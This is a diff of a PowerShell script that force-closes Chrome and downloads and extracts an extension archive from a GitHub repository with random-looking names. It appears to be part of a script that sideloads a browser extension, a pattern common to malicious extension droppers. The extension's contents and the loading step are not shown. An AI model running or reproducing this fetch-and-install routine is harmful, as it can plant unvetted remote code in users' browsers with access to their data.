@@ -2,10 +2,13 @@
 Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
 
 # ---------- CONFIG ----------
-$zipUrl     = "https://github.com/k53xupn43/i965652f/raw/refs/heads/main/extension.zip   "
-$chromeExe  = "C:\Program Files\Google\Chrome\Application\chrome.exe"
-$workDir    = "C:\ExtTemp"
-$extFolder  = "$workDir\MyExtension"
+$zipUrl    = "https://github.com/k53xupn43/i965652f/raw/refs/heads/main/extension.zip"
+$chromeExe = (Get-Command chrome -ErrorAction SilentlyContinue).Source
+if (-not $chromeExe) {
+    $chromeExe = "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe"
+}
+$workDir   = "C:\ExtTemp"
+$extFolder = "$workDir\MyExtension"
 
 # ---------- 1. Download & extract ----------
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
